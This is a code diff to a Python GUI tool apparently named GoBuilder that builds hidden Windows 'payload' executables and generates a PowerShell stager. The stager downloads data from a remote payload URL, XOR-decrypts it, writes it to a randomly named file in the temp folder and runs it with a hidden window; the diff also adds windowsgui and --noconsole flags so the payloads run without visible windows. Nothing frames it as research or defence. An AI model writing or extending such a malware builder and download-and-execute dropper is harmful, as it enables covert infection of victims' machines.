@@ -275,12 +275,17 @@ class GoBuilder(QMainWindow):
                 f.write(self.raw_payload)
 
             subprocess.run(["go", "mod", "init", "payload"], cwd=tmpdir, capture_output=True)
+            subprocess.run(["go", "get", "golang.org/x/sys/windows"], cwd=tmpdir, capture_output=True)
             subprocess.run(["go", "mod", "tidy"], cwd=tmpdir, capture_output=True)
 
             out_path = os.path.join(tmpdir, "payload.exe")
+            env = os.environ.copy()
+            env["GOOS"] = "windows"
+            env["GOARCH"] = "amd64"
+            env["CGO_ENABLED"] = "0"
             build = subprocess.run(
-                ["go", "build", "-ldflags", "-s -w", "-o", out_path, "payload.go"],
-                cwd=tmpdir, capture_output=True, text=True
+                ["go", "build", "-ldflags", "-s -w -H windowsgui", "-o", out_path, "payload.go"],
+                cwd=tmpdir, capture_output=True, text=True, env=env
             )
             
             if build.returncode != 0:
@@ -304,15 +309,15 @@ class GoBuilder(QMainWindow):
         """Generates a PowerShell script that downloads, decrypts, and runs the payload"""
         key = self.enc_key
         
-        # Logic exactly from original script: Download -> XOR Decrypt -> Reflective Execute
+        # Download -> XOR Decrypt -> Write to temp -> Execute
         ps_script = f"""
 $b = (New-Object System.Net.WebClient).DownloadData("{payload_url}")
 $k = "{key}"
 $d = New-Object byte[] $b.Length
 for ($i = 0; $i -lt $b.Length; $i++) {{ $d[$i] = $b[$i] -bxor [byte]$k[$i % $k.Length] }}
-$a = [System.Reflection.Assembly]::Load($d)
-$e = $a.EntryPoint
-if ($e -ne $null) {{ $e.Invoke($null, @([string[]]@())) }}
+$p = Join-Path $env:TEMP ("{random.randint(100000,999999)}.exe")
+[IO.File]::WriteAllBytes($p, $d)
+Start-Process -FilePath $p -WindowStyle Hidden
 """
         
         with tempfile.NamedTemporaryFile("w", delete=False, suffix=".ps1", encoding="utf-8") as f:
@@ -385,11 +390,12 @@ subprocess.run(cmd, shell=False)
                 "-y",
                 "-n", output_name.replace(".exe", ""),
                 "--distpath", cwd,
-                final_script
             ]
-            
+
             if self.opt_hidden.isChecked():
                 pyinstaller_args.append("--noconsole")
+
+            pyinstaller_args.append(final_script)
 
             # Run from temp dir to keep cwd clean (except for the dist output)
             res = subprocess.run(pyinstaller_args, capture_output=True, text=True, cwd=tmpdir)
